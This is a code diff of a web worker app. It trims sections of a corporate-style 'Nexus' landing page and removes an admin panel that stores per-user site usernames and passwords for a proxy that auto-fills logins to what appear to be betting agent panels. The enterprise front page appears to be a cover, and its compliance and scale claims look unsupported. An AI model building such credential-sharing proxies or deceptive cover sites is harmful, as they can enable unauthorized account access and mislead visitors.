@@ -111,119 +111,10 @@ const landingPageHTML = `
         </div>
     </div>
 
-    <!-- Features Section -->
-    <section id="solutions" class="py-24 bg-[#050505] border-b border-white/5">
-        <div class="max-w-7xl mx-auto px-6">
-            <div class="text-center mb-16">
-                <span class="text-indigo-500 text-[10px] font-bold uppercase tracking-widest mb-2 block">Core Capabilities</span>
-                <h2 class="text-3xl md:text-4xl font-light text-white">Enterprise-Grade <span class="font-bold">Architecture</span></h2>
-            </div>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                <div class="feature-box p-8">
-                    <svg class="w-8 h-8 text-indigo-400 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 002-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"></path></svg>
-                    <h3 class="text-lg font-bold text-white mb-3 tracking-wide">Data Sovereignty</h3>
-                    <p class="text-xs text-gray-400 leading-relaxed">Ensure total compliance with localized data storage. Our infrastructure guarantees isolated instances across 45+ geographic regions.</p>
-                </div>
-                <div class="feature-box p-8">
-                    <svg class="w-8 h-8 text-indigo-400 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
-                    <h3 class="text-lg font-bold text-white mb-3 tracking-wide">Zero Trust Security</h3>
-                    <p class="text-xs text-gray-400 leading-relaxed">Built from the ground up with military-grade encryption and strict access protocols. Every request is strictly authenticated and logged.</p>
-                </div>
-                <div class="feature-box p-8">
-                    <svg class="w-8 h-8 text-indigo-400 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-                    <h3 class="text-lg font-bold text-white mb-3 tracking-wide">Low-Latency Edge</h3>
-                    <p class="text-xs text-gray-400 leading-relaxed">We leverage edge computing nodes globally to bring your assets closer to your workforce, ensuring minimal loading delays worldwide.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Global Infrastructure Info -->
-    <section id="infrastructure" class="py-24 bg-[#080808] relative overflow-hidden">
-        <div class="absolute right-0 top-0 w-1/2 h-full opacity-10 flex items-center justify-center pointer-events-none">
-            <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg" class="w-full h-full scale-150 transform translate-x-1/4">
-                <path fill="#4f46e5" d="M44.7,-76.4C58.8,-69.2,71.8,-59.1,81.3,-46.3C90.8,-33.5,96.8,-18.1,95.5,-3.2C94.2,11.7,85.6,26.1,75.4,38.1C65.2,50.1,53.4,59.7,40.1,67.6C26.8,75.5,12.1,81.7,-2.8,86.5C-17.7,91.3,-35.4,85.1,-48.5,75.4C-61.6,65.7,-70.1,52.5,-77.8,38.4C-85.5,24.3,-92.4,9.3,-92.1,-5.6C-91.8,-20.5,-84.3,-35.3,-74.1,-47.1C-63.9,-58.9,-51,-67.7,-37.2,-74.8C-23.4,-81.9,-8.7,-87.3,3.3,-92.7C15.3,-98.1,30.6,-83.6,44.7,-76.4Z" transform="translate(100 100)" />
-            </svg>
-        </div>
-        <div class="max-w-7xl mx-auto px-6 relative z-10 flex flex-col md:flex-row items-center gap-12">
-            <div class="md:w-1/2">
-                <h2 class="text-3xl md:text-4xl font-light text-white mb-6">Designed for <span class="font-bold">Scale.</span></h2>
-                <p class="text-gray-400 text-sm leading-relaxed mb-8">Nexus powers top-tier financial platforms, health registries, and governmental agencies. Our backbone network routes over 50 Tbps of traffic daily without compromising a single packet.</p>
-                <div class="space-y-4">
-                    <div class="flex items-center gap-4 border-b border-white/5 pb-4">
-                        <div class="w-10 h-10 bg-indigo-500/10 flex items-center justify-center border border-indigo-500/20"><span class="text-indigo-400 font-bold">01</span></div>
-                        <div><h4 class="text-sm font-bold text-white uppercase tracking-widest">DDoS Mitigation</h4><p class="text-[10px] text-gray-500 uppercase tracking-widest">Automated L3/L4/L7 Protection</p></div>
-                    </div>
-                    <div class="flex items-center gap-4 border-b border-white/5 pb-4">
-                        <div class="w-10 h-10 bg-indigo-500/10 flex items-center justify-center border border-indigo-500/20"><span class="text-indigo-400 font-bold">02</span></div>
-                        <div><h4 class="text-sm font-bold text-white uppercase tracking-widest">Auto-Scaling Nodes</h4><p class="text-[10px] text-gray-500 uppercase tracking-widest">Kubernetes Managed Clusters</p></div>
-                    </div>
-                    <div class="flex items-center gap-4">
-                        <div class="w-10 h-10 bg-indigo-500/10 flex items-center justify-center border border-indigo-500/20"><span class="text-indigo-400 font-bold">03</span></div>
-                        <div><h4 class="text-sm font-bold text-white uppercase tracking-widest">Disaster Recovery</h4><p class="text-[10px] text-gray-500 uppercase tracking-widest">Multi-AZ Data Redundancy</p></div>
-                    </div>
-                </div>
-            </div>
-            <div class="md:w-1/2 flex justify-center">
-                <div class="relative w-full max-w-md p-6 border border-white/10 bg-black/50 backdrop-blur-sm">
-                    <div class="flex items-center justify-between border-b border-white/10 pb-4 mb-4">
-                        <span class="text-[10px] text-gray-400 uppercase tracking-widest font-bold">System Status</span>
-                        <span class="flex items-center gap-2 text-[10px] text-green-400 font-bold uppercase tracking-widest"><div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div> All Systems Operational</span>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="flex justify-between text-xs"><span class="text-gray-500">US-East (Virginia)</span><span class="text-white">12ms</span></div>
-                        <div class="flex justify-between text-xs"><span class="text-gray-500">EU-Central (Frankfurt)</span><span class="text-white">15ms</span></div>
-                        <div class="flex justify-between text-xs"><span class="text-gray-500">AP-Southeast (Singapore)</span><span class="text-white">18ms</span></div>
-                        <div class="flex justify-between text-xs"><span class="text-gray-500">SA-East (São Paulo)</span><span class="text-white">22ms</span></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
     <!-- Massive Footer -->
     <footer id="contact" class="pt-24 pb-10 px-6 bg-[#030303] border-t border-white/5">
-        <div class="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-12 border-b border-white/5 pb-16 mb-8">
-            <div class="md:col-span-2">
-                <div class="text-xl font-bold tracking-widest uppercase mb-4 flex items-center gap-2">
-                    <svg class="w-6 h-6 text-indigo-500" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
-                    Nexus<span class="text-gray-500">.</span>
-                </div>
-                <p class="text-gray-500 text-xs leading-relaxed max-w-sm mb-6">Nexus provides secure, enterprise-grade data management and registry services for global organizations. Ensuring privacy and scale.</p>
-                <div class="flex items-center gap-4 text-gray-500">
-                    <span class="text-[10px] uppercase tracking-widest font-bold border border-white/10 px-2 py-1">SOC 2 TYPE II</span>
-                    <span class="text-[10px] uppercase tracking-widest font-bold border border-white/10 px-2 py-1">ISO 27001</span>
-                </div>
-            </div>
-            <div>
-                <h4 class="text-white text-[10px] font-bold uppercase tracking-widest mb-6">Company</h4>
-                <ul class="space-y-3 text-xs text-gray-500">
-                    <li><a href="#" class="hover:text-indigo-400 transition">About Us</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Careers</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Press & Media</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Contact Sales</a></li>
-                </ul>
-            </div>
-            <div>
-                <h4 class="text-white text-[10px] font-bold uppercase tracking-widest mb-6">Legal</h4>
-                <ul class="space-y-3 text-xs text-gray-500">
-                    <li><a href="#" class="hover:text-indigo-400 transition">Privacy Policy</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Terms of Service</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Data Processing</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Cookie Preferences</a></li>
-                </ul>
-            </div>
-        </div>
         <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
             <p class="text-[10px] text-gray-600 uppercase tracking-widest">&copy; 2026 Nexus Digital Enterprise. All rights reserved.</p>
-            <div class="flex gap-4">
-                <div class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition cursor-pointer">
-                    <svg class="w-3.5 h-3.5 text-gray-400" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"/></svg>
-                </div>
-                <div class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition cursor-pointer">
-                    <svg class="w-3.5 h-3.5 text-gray-400" fill="currentColor" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
-                </div>
-            </div>
         </div>
     </footer>
 
@@ -449,272 +340,6 @@ export default {
             };
         </script>`;
 
-        // --- 🛠️ ADMIN PANEL ---
-        if (path.startsWith("/admin")) {
-            if (!isAdmin) return Response.redirect(url.origin, 302);
-            if (path === "/admin/api/data") return new Response(JSON.stringify(db));
-            if (path === "/admin/api/save" && request.method === "POST") {
-                const newData = await request.json();
-                await updateDB(newData);
-                return new Response("Saved");
-            }
-
-            const adminHTML = `<!DOCTYPE html><html lang="en" class="dark">
-            <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Portal</title><script src="https://cdn.tailwindcss.com"></script>
-            <style>
-                body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; } 
-                .square-card { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.05); } 
-                .active-tab { border-b-2 border-indigo-400; color: white; }
-                .square-checkbox { appearance: none; width: 14px; height: 14px; border: 1px solid rgba(255,255,255,0.3); background: rgba(0,0,0,0.5); cursor: pointer; position: relative; transition: all 0.2s; }
-                .square-checkbox:checked { background: #6366f1; border-color: #6366f1; }
-                .square-checkbox:checked::after { content: '✓'; position: absolute; color: white; font-size: 10px; font-weight: bold; left: 2px; top: -1px; }
-                .square-select { appearance: none; border-radius: 0; background: #000; border: 1px solid rgba(255,255,255,0.2); outline: none; cursor: pointer; }
-                .square-select:focus { border-color: #6366f1; }
-            </style>
-            </head>
-            <body class="pb-28">
-                ${customModalScript}
-                <header class="sticky top-0 z-40 flex justify-between items-center border-b border-white/10 bg-[#0a0a0a] p-4 md:p-6 shadow-md w-full">
-                    <div><h1 class="text-lg md:text-xl font-bold tracking-widest uppercase text-indigo-400">Master <span class="text-white">Admin</span></h1></div>
-                    <a href="/logout" class="px-5 py-2.5 bg-red-900/20 text-[10px] font-bold tracking-widest uppercase border border-red-900/50 text-red-500 hover:bg-red-600 hover:text-white transition">Logout</a>
-                </header>
-                <div class="max-w-6xl mx-auto p-4 md:p-8" id="app">
-                    <div class="flex justify-center items-center h-40"><div class="animate-spin w-8 h-8 border-2 border-indigo-500 border-t-transparent rounded-full"></div></div>
-                </div>
-                <div class="fixed bottom-0 left-0 w-full bg-[#050505] border-t border-white/10 p-4 z-50 flex justify-center backdrop-blur-md">
-                    <button id="save-btn" onclick="save()" class="w-full max-w-sm bg-white text-black font-bold uppercase tracking-widest py-4 hover:bg-gray-200 transition shadow-[0_0_20px_rgba(255,255,255,0.2)]">SAVE ALL CHANGES</button>
-                </div>
-                <script>
-                    let db = {}; let tab = 'pins'; let openPins = new Set(); let searchQuery = '';
-
-                    async function load(){ const res = await fetch('/admin/api/data'); db = await res.json(); render(); }
-                    async function save(){ 
-                        document.getElementById('save-btn').innerText = 'SAVING...';
-                        await fetch('/admin/api/save', {method:'POST', body:JSON.stringify(db)}); 
-                        setTimeout(() => { document.getElementById('save-btn').innerText = 'SAVE ALL CHANGES'; CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Database Successfully Updated!'}); }, 500);
-                    }
-
-                    function uPinSt(pin, val) { db.pins[pin].status = val; render(); }
-                    function uPinF(pin, field, val) { db.pins[pin][field] = val; }
-                    function uSiteF(id, f, val) { db.sites[id][f] = val; }
-                    function uSet(f, val) { db.settings[f] = val; }
-                    function uNotif(f, val) { db.settings.notification[f] = val; }
-                    
-                    function toggleSite(pin, siteId, chk) {
-                        let list = db.pins[pin].sites ||[];
-                        if(!db.pins[pin].siteConf) db.pins[pin].siteConf = {};
-                        if(chk && !list.includes(siteId)) {
-                            list.push(siteId);
-                            db.pins[pin].siteConf[siteId] = {u:'', r:'Admin', p:''};
-                        } else if(!chk) {
-                            list = list.filter(i => i !== siteId);
-                            delete db.pins[pin].siteConf[siteId];
-                        }
-                        db.pins[pin].sites = list;
-                        render();
-                    }
-
-                    function uPinSiteConf(pin, siteId, field, val) {
-                        if(!db.pins[pin].siteConf) db.pins[pin].siteConf = {};
-                        if(!db.pins[pin].siteConf[siteId]) db.pins[pin].siteConf[siteId] = {u:'', r:'Admin', p:''};
-                        db.pins[pin].siteConf[siteId][field] = val;
-                    }
-                    
-                    function toggleNotifUser(pin, chk) {
-                        let list = db.settings.notification.specificUsers ||[];
-                        if(chk && !list.includes(pin)) list.push(pin);
-                        else if(!chk) list = list.filter(i => i !== pin);
-                        db.settings.notification.specificUsers = list;
-                    }
-
-                    function addSite() { db.sites['s_'+Date.now()] = {name:'', agentLink:'', userLink:'', apiLink:'', bankingLink:''}; tab='sites'; render(); }
-                    
-                    function addPin() { 
-                        CustomModal.show({type:'prompt', title:'New User', text:'Enter User Name (e.g. John Doe):', onConfirm: (name) => {
-                            if(!name) return;
-                            CustomModal.show({type:'prompt', title:'Set PIN', text:'Enter Secret PIN for this User:', onConfirm: (p) => {
-                                if(p && !db.pins[p]){ 
-                                    db.pins[p] = { name: name, status:'active', sites:[], siteConf:{} }; 
-                                    openPins.add(p); tab='pins'; render(); 
-                                } else if(db.pins[p]) {
-                                    CustomModal.show({type:'alert', title:'<span class="text-red-500">✖</span> Error', text:'This PIN already exists!'});
-                                }
-                            }});
-                        }});
-                    }
-
-                    function delSite(id) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete Site', text:'Are you sure you want to delete this site?', onConfirm: (yes) => { if(yes) { delete db.sites[id]; render(); } }}); }
-                    function delPin(pin) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete User', text:'Are you sure you want to delete this user PIN?', onConfirm: (yes) => { if(yes) { delete db.pins[pin]; render(); } }}); }
-
-                    function toggleAdminPin(pin) {
-                        if(openPins.has(pin)) openPins.delete(pin); else openPins.add(pin);
-                        render();
-                    }
-
-                    function render() {
-                        if(!db.sites) db.sites = {}; if(!db.pins) db.pins = {}; if(!db.settings) db.settings = {whatsapp:'', notification:{enabled:false, target:'all', specificUsers:[]}};
-                        let html = \`<div class="flex gap-6 mb-8 border-b border-white/10 px-2 overflow-x-auto custom-scrollbar">
-                            <button onclick="tab='pins'; render()" class="pb-3 text-xs font-bold uppercase tracking-widest \${tab==='pins'?'active-tab':'text-gray-500 hover:text-gray-300'} whitespace-nowrap">User Pins</button>
-                            <button onclick="tab='sites'; render()" class="pb-3 text-xs font-bold uppercase tracking-widest \${tab==='sites'?'active-tab':'text-gray-500 hover:text-gray-300'} whitespace-nowrap">Global Sites</button>
-                            <button onclick="tab='settings'; render()" class="pb-3 text-xs font-bold uppercase tracking-widest \${tab==='settings'?'active-tab':'text-gray-500 hover:text-gray-300'} whitespace-nowrap">System Settings</button>
-                        </div>\`;
-
-                        if(tab === 'pins') {
-                            html += \`<div class="flex flex-col md:flex-row justify-between items-center mb-6 gap-4">
-                                <input type="text" placeholder="Search Users or PIN..." value="\${searchQuery}" oninput="searchQuery=this.value.toLowerCase(); render()" class="w-full md:w-1/2 bg-black border border-white/10 p-3 text-xs text-white outline-none focus:border-indigo-500">
-                                <button onclick="addPin()" class="w-full md:w-auto bg-indigo-600/20 border border-indigo-500/50 text-indigo-400 px-5 py-3 text-[10px] font-bold uppercase tracking-widest hover:bg-indigo-600 hover:text-white transition">+ Add New User</button>
-                            </div>
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-5">\`;
-                            Object.keys(db.pins).filter(p => p.toLowerCase().includes(searchQuery) || (db.pins[p].name||'').toLowerCase().includes(searchQuery)).forEach(pin => {
-                                let pData = db.pins[pin];
-                                let st = pData.status;
-                                let bg = st==='active' ? 'text-green-400 border-green-400/20 bg-green-400/10' : 'text-red-400 border-red-400/20 bg-red-400/10';
-                                let isOpen = openPins.has(pin);
-                                html += \`<div class="square-card flex flex-col \${st==='suspended'?'opacity-70 grayscale':''}">
-                                    <div class="flex justify-between items-center p-5 cursor-pointer hover:bg-white/5 transition" onclick="toggleAdminPin('\${pin}')">
-                                        <div class="flex flex-col truncate pr-4">
-                                            <span class="text-lg font-bold text-white truncate">\${pData.name || 'Unnamed'}</span>
-                                            <span class="text-[10px] text-indigo-400 uppercase tracking-widest font-bold mt-1">PIN: \${pin}</span>
-                                        </div>
-                                        <div class="flex items-center gap-4 flex-shrink-0">
-                                            <select onclick="event.stopPropagation()" onchange="uPinSt('\${pin}', this.value)" class="square-select text-[9px] font-bold uppercase tracking-widest px-2 py-1 \${bg}">
-                                                <option value="active" \${st==='active'?'selected':''}>ACTIVE</option>
-                                                <option value="suspended" \${st==='suspended'?'selected':''}>SUSPEND</option>
-                                            </select>
-                                            <svg class="w-4 h-4 text-gray-500 transition-transform duration-300 \${isOpen?'rotate-180':''}" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
-                                        </div>
-                                    </div>
-                                    <div class="\${isOpen?'block':'hidden'} p-5 border-t border-white/5 bg-black/40">
-                                        <div class="mb-4">
-                                            <label class="text-[8px] uppercase tracking-widest text-gray-500 mb-1 block">Edit User Name</label>
-                                            <input value="\${pData.name || ''}" oninput="uPinF('\${pin}','name',this.value)" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-indigo-500">
-                                        </div>
-                                        <span class="text-[8px] font-bold text-gray-500 uppercase tracking-widest block mb-2">Assign Sites & Roles:</span>
-                                        <div class="space-y-3 max-h-60 overflow-y-auto pr-2 custom-scrollbar">\`;
-                                        Object.keys(db.sites).forEach(siteId => {
-                                            let hasSite = (pData.sites||[]).includes(siteId);
-                                            let conf = pData.siteConf?.[siteId] || {u:'', r:'Admin', p:''};
-                                            html += \`<div class="bg-[#0a0a0a] border border-white/10 p-3">
-                                                <label class="flex items-center gap-3 text-xs cursor-pointer">
-                                                    <input type="checkbox" \${hasSite ? 'checked':''} onchange="toggleSite('\${pin}', '\${siteId}', this.checked)" class="square-checkbox w-4 h-4">
-                                                    <span class="truncate text-gray-300 font-bold">\${db.sites[siteId].name || 'Unnamed Site'}</span>
-                                                </label>\`;
-                                            if(hasSite) {
-                                                html += \`<div class="mt-3 pl-7 space-y-2 border-l border-white/10 ml-2">
-                                                    <input value="\${conf.u}" oninput="uPinSiteConf('\${pin}','\${siteId}','u',this.value)" placeholder="Username" class="w-full bg-black border border-white/10 p-2 text-[10px] text-white outline-none focus:border-indigo-500">
-                                                    <input value="\${conf.p||''}" oninput="uPinSiteConf('\${pin}','\${siteId}','p',this.value)" placeholder="Password" class="w-full bg-black border border-white/10 p-2 text-[10px] text-white outline-none focus:border-indigo-500">
-                                                    <select onchange="uPinSiteConf('\${pin}','\${siteId}','r',this.value)" class="square-select w-full bg-black border border-white/10 p-2 text-[10px] text-gray-300 outline-none focus:border-indigo-500">
-                                                        <option value="Admin" \${conf.r==='Admin'?'selected':''}>Admin</option>
-                                                        <option value="Super Agent" \${conf.r==='Super Agent'?'selected':''}>Super Agent</option>
-                                                        <option value="Master Agent" \${conf.r==='Master Agent'?'selected':''}>Master Agent</option>
-                                                    </select>
-                                                </div>\`;
-                                            }
-                                            html += \`</div>\`;
-                                        });
-                                    html += \`</div><button onclick="delPin('\${pin}')" class="mt-5 w-full py-2.5 bg-red-900/20 text-red-500 text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-red-900/50 transition border border-red-900/30">Delete User</button></div></div>\`;
-                            });
-                            html += \`</div>\`;
-                        }
-
-                        if(tab === 'sites') {
-                            html += \`<div class="flex justify-between items-center mb-6">
-                                <h3 class="text-[10px] font-bold uppercase tracking-[0.2em] text-gray-500">Website Directory</h3>
-                                <button onclick="addSite()" class="bg-indigo-600/20 border border-indigo-500/50 text-indigo-400 px-4 py-2 text-[10px] font-bold uppercase tracking-widest hover:bg-indigo-600 hover:text-white transition">+ Add Site</button>
-                            </div>
-                            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">\`;
-                            Object.keys(db.sites).forEach(id => {
-                                html += \`<div class="square-card p-5 flex flex-col">
-                                    <div class="mb-4">
-                                        <span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Site Name</span>
-                                        <input value="\${db.sites[id].name}" oninput="uSiteF('\${id}','name',this.value)" placeholder="Enter Website Name..." class="w-full bg-transparent text-xl font-bold text-white border-b border-white/10 outline-none pb-1 focus:border-indigo-500">
-                                    </div>
-                                    <div class="space-y-3 mb-5 flex-grow">
-                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Agent Link</span>
-                                        <input value="\${db.sites[id].agentLink}" oninput="uSiteF('\${id}','agentLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-2 text-xs text-green-400 outline-none focus:border-white/30"></div>
-                                        
-                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">User Link</span>
-                                        <input value="\${db.sites[id].userLink}" oninput="uSiteF('\${id}','userLink',this.value)" placeholder="ag.example.com" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-blue-400 outline-none focus:border-white/30"></div>
-                                        
-                                        <div>
-                                            <span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Backend API Link (For Login/Live Balance)</span>
-                                            <input value="\${db.sites[id].apiLink||''}" oninput="uSiteF('\${id}','apiLink',this.value)" placeholder="e.g. https://liveapi247.live" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-purple-400 outline-none focus:border-white/30">
-                                            <p class="text-[8px] text-gray-600 mt-1 italic">If the site loads balance from another domain, put it here.</p>
-                                        </div>
-
-                                        <div class="mt-4 pt-3 border-t border-white/5">
-                                            <span class="text-[8px] text-yellow-500 font-bold uppercase tracking-widest mb-1 block">Banking / Add Balance Link (For Auto-fill)</span>
-                                            <input value="\${db.sites[id].bankingLink||''}" oninput="uSiteF('\${id}','bankingLink',this.value)" placeholder="e.g. /agent/banking or full URL" class="w-full bg-yellow-500/10 border border-yellow-500/30 p-2 text-xs text-yellow-400 outline-none focus:border-yellow-500">
-                                            <p class="text-[8px] text-gray-500 mt-1 italic">When user goes to this link, password will auto-fill again.</p>
-                                        </div>
-                                    </div>
-                                    <button onclick="delSite('\${id}')" class="w-full py-2.5 bg-red-900/20 text-red-500 text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-red-900/50 transition border border-red-900/30">Delete Site</button>
-                                </div>\`;
-                            });
-                            html += \`</div>\`;
-                        }
-
-                        if(tab === 'settings') {
-                            let n = db.settings.notification;
-                            html += \`<div class="grid grid-cols-1 md:grid-cols-2 gap-5">
-                                <div class="square-card p-6">
-                                    <h2 class="text-sm font-bold tracking-widest uppercase mb-6 text-green-500">WhatsApp Float</h2>
-                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Phone Number</label>
-                                    <input value="\${db.settings.whatsapp||''}" oninput="uSet('whatsapp',this.value)" placeholder="+8801..." class="w-full bg-black/50 border border-white/10 p-3 text-sm outline-none focus:border-green-500 text-green-400">
-                                </div>
-                                <div class="square-card p-6">
-                                    <div class="flex justify-between items-center mb-6">
-                                        <h2 class="text-sm font-bold tracking-widest uppercase text-indigo-400">Notice Popup</h2>
-                                        <label class="flex items-center gap-2 text-[10px] font-bold uppercase cursor-pointer text-indigo-400 bg-indigo-900/20 px-3 py-1 border border-indigo-500/30 rounded-sm">
-                                            <input type="checkbox" \${n.enabled?'checked':''} onchange="uNotif('enabled',this.checked)" class="square-checkbox border-indigo-500"> Enable
-                                        </label>
-                                    </div>
-                                    <div class="mb-4 border-b border-white/10 pb-4">
-                                        <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Target Audience</label>
-                                        <select onchange="uNotif('target', this.value); render()" class="square-select w-full p-2 text-xs text-white">
-                                            <option value="all" \${n.target==='all'?'selected':''}>Broadcast to ALL Users</option>
-                                            <option value="specific" \${n.target==='specific'?'selected':''}>Send to SPECIFIC Users</option>
-                                        </select>
-                                        \`;
-                                        if(n.target === 'specific') {
-                                            html += \`<div class="mt-3 space-y-1 max-h-32 overflow-y-auto pr-2 custom-scrollbar">\`;
-                                            Object.keys(db.pins).forEach(p => {
-                                                let chk = (n.specificUsers||[]).includes(p) ? 'checked' : '';
-                                                html += \`<label class="flex items-center gap-2 text-xs bg-white/5 border border-white/5 p-2 cursor-pointer hover:bg-white/10">
-                                                    <input type="checkbox" \${chk} onchange="toggleNotifUser('\${p}', this.checked)" class="square-checkbox">
-                                                    <span class="truncate text-gray-300">\${db.pins[p].name || 'Unnamed'} <span class="text-indigo-400">(\${p})</span></span>
-                                                </label>\`;
-                                            });
-                                            html += \`</div>\`;
-                                        }
-                                        html += \`
-                                    </div>
-                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Message</label>
-                                    <textarea oninput="uNotif('text',this.value)" placeholder="Enter notice..." class="w-full bg-black/50 border border-white/10 p-3 text-xs mb-3 outline-none min-h-[80px] focus:border-indigo-500 custom-scrollbar">\${n.text||''}</textarea>
-                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Image URL (Optional)</label>
-                                    <input value="\${n.image||''}" oninput="uNotif('image',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-3 text-xs mb-3 outline-none focus:border-indigo-500">
-                                    <div class="flex gap-3">
-                                        <div class="w-1/2">
-                                            <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Btn Text</label>
-                                            <input value="\${n.btnText||''}" oninput="uNotif('btnText',this.value)" placeholder="JOIN NOW" class="w-full bg-black/50 border border-white/10 p-3 text-xs outline-none focus:border-indigo-500">
-                                        </div>
-                                        <div class="w-1/2">
-                                            <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Btn Link</label>
-                                            <input value="\${n.btnLink||''}" oninput="uNotif('btnLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-3 text-xs outline-none focus:border-indigo-500">
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>\`;
-                        }
-                        document.getElementById('app').innerHTML = html;
-                    }
-                    load();
-                </script>
-            </body>
-            </html>`;
-            return new Response(adminHTML, { headers: { "Content-Type": "text/html" } });
-        }
-
         // --- 💻 USER DASHBOARD & PROXY INIT ---
         if (path === "/dashboard") {
             if (!isUser) return Response.redirect(url.origin, 302);
@@ -745,7 +370,7 @@ export default {
 
                     const connectBtn = isSuspended 
                         ? `<button disabled class="w-full py-4 bg-white/5 text-gray-500 text-[10px] font-bold uppercase tracking-[0.2em] cursor-not-allowed border border-white/5 mt-4">Suspended</button>`
-                        : `<button onclick="${loginAction}" class="w-full py-4 bg-white text-black text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-gray-200 transition-colors flex items-center justify-center gap-2 mt-4 shadow-[0_0_15px_rgba(255,255,255,0.1)] outline-none"><span>Login Your Panel</span><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg></button>`;
